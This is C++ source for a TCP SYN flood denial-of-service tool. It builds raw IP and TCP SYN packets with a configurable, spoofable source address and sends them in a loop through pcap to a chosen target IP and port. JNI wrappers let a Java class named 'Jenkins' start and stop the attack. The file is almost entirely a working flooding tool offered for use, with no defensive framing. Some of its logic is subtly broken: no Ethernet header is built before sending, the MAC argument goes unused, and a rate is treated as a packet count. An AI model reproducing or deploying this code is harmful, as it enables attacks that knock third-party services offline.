#include <winsock2.h>
#include <ws2tcpip.h>
#include <pcap.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <ctime>
#include "tcpsynflood.h"
#include <jni.h> // Added JNI header

#define PACKET_SIZE 8192
#define TH_SYN 0x02

#pragma comment(lib, "ws2_32.lib")

// Global variable to control attack stop
volatile bool stop_attack = false;


void list_devices() {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *alldevs;
    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
        return;
    }
    for (pcap_if_t *d = alldevs; d; d = d->next) {
        printf("Device: %s - %s\n", d->name, (d->description) ? d->description : "No description available");
    }
    pcap_freealldevs(alldevs);
}

extern "C" {

// Correct JNI function signature for tcpSynFloodJNI
JNIEXPORT jint JNICALL Java_com_yourpackage_Jenkins_tcpSynFloodJNI(JNIEnv *env, jobject obj, jstring jtargetIp, jint jtargetPort, jlong jbytesPerSecond, jstring jsourceIp, jstring jsourceMac, jstring jnetworkCard) {
    const char *targetIp = env->GetStringUTFChars(jtargetIp, nullptr);
    const char *sourceIp = env->GetStringUTFChars(jsourceIp, nullptr);
    const char *sourceMac = env->GetStringUTFChars(jsourceMac, nullptr);
    const char *networkCard = env->GetStringUTFChars(jnetworkCard, nullptr);
    int targetPort = static_cast<int>(jtargetPort);
    long bytesPerSecond = static_cast<long>(jbytesPerSecond);

    // Reset the stop_attack flag
    stop_attack = false;

    // Call the C++ function for TCP SYN flood
    int result = tcp_syn_flood(sourceIp, targetIp, targetPort, bytesPerSecond, networkCard);

    // Release strings
    env->ReleaseStringUTFChars(jtargetIp, targetIp);
    env->ReleaseStringUTFChars(jsourceIp, sourceIp);
    env->ReleaseStringUTFChars(jsourceMac, sourceMac);
    env->ReleaseStringUTFChars(jnetworkCard, networkCard);

    return result;
}

// Correct JNI function signature for nativeStopAttack
JNIEXPORT void JNICALL Java_com_yourpackage_Jenkins_nativeStopAttack(JNIEnv *env, jobject obj) {
    stop_attack = true; // Set the global variable to stop the attack
}

}

// Winsock initialization function
bool initialize_winsock() {
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        fprintf(stderr, "WSAStartup failed with error: %d\n", iResult);
        return false;
    }
    return true;
}

// TCP checksum calculation function
unsigned short checksum(void *b, int len) {
    unsigned short *buf = (unsigned short *)b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2) {
        sum += *buf++;
    }
    if (len == 1) {
        sum += *(unsigned char *)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// IP header structure for Windows
struct ip_header {
    unsigned char ip_hl : 4;   // Header length
    unsigned char ip_v : 4;    // Version
    unsigned char ip_tos;      // Type of service
    unsigned short ip_len;     // Total length
    unsigned short ip_id;      // Identification
    unsigned short ip_off;     // Fragment offset field
    unsigned char ip_ttl;      // Time to live
    unsigned char ip_p;        // Protocol
    unsigned short ip_sum;     // Checksum
    struct in_addr ip_src, ip_dst; // Source and dest address
};

// TCP header structure for Windows
struct tcp_header {
    unsigned short th_sport;   // Source port
    unsigned short th_dport;   // Destination port
    unsigned int th_seq;       // Sequence number
    unsigned int th_ack;       // Acknowledgment number
    unsigned char th_off : 4;  // Data offset
    unsigned char th_x2 : 4;   // (Unused)
    unsigned char th_flags;    // TCP flags
    unsigned short th_win;     // Window size
    unsigned short th_sum;     // Checksum
    unsigned short th_urp;     // Urgent pointer
};

// Build the TCP SYN packet
void build_syn_packet(char *packet, const char *src_ip, const char *dest_ip, int dest_port, int seq) {
    struct ip_header *iph = (struct ip_header *)packet;
    struct tcp_header *tcph = (struct tcp_header *)(packet + sizeof(struct ip_header));

    memset(packet, 0, PACKET_SIZE);

    // Fill in the IP Header
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 0;
    iph->ip_len = htons(sizeof(struct ip_header) + sizeof(struct tcp_header));
    iph->ip_id = htons(54321);
    iph->ip_off = 0;
    iph->ip_ttl = 255;
    iph->ip_p = IPPROTO_TCP;
    iph->ip_sum = 0;
    inet_pton(AF_INET, src_ip, &iph->ip_src);
    inet_pton(AF_INET, dest_ip, &iph->ip_dst);
    iph->ip_sum = checksum((unsigned short *)packet, sizeof(struct ip_header));

    // Fill in the TCP Header
    tcph->th_sport = htons(12345);
    tcph->th_dport = htons(dest_port);
    tcph->th_seq = htonl(seq);
    tcph->th_ack = 0;
    tcph->th_off = 5;
    tcph->th_flags = TH_SYN;
    tcph->th_win = htons(32767);
    tcph->th_sum = 0;
    tcph->th_urp = 0;

    // Calculate TCP checksum
    struct pseudo_header {
        unsigned long source_address;
        unsigned long dest_address;
        unsigned char placeholder;
        unsigned char protocol;
        unsigned short tcp_length;
    } psh;

    psh.source_address = inet_addr(src_ip);
    psh.dest_address = inet_addr(dest_ip);
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcp_header));

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcp_header);
    char *pseudogram = (char *)malloc(psize);

    memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcp_header));

    tcph->th_sum = checksum((unsigned short *)pseudogram, psize);

    free(pseudogram);
}

// Perform the TCP SYN flood attack
int tcp_syn_flood(const char *source_ip, const char *target_ip, int target_port, int num_packets, const char *iface) {
    if (!initialize_winsock()) {
        return 1;
    }

    char error_buffer[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(iface, BUFSIZ, 1, 1000, error_buffer);

    if (handle == NULL) {
        fprintf(stderr, "Could not open device %s: %s\n", iface, error_buffer);
        return 2;
    }

    srand(time(NULL));

    for (int i = 0; i < num_packets; i++) {
        if (stop_attack) {
            fprintf(stdout, "Attack stopped.\n");
            break;
        }

        char packet[PACKET_SIZE];
        int seq = rand();
        build_syn_packet(packet, source_ip, target_ip, target_port, seq);

        if (pcap_sendpacket(handle, (const u_char *)packet, sizeof(struct ip_header) + sizeof(struct tcp_header)) != 0) {
            fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(handle));
            pcap_close(handle);
            WSACleanup();
            return 2;
        }
    }

    pcap_close(handle);
    WSACleanup();
    return 0;
}
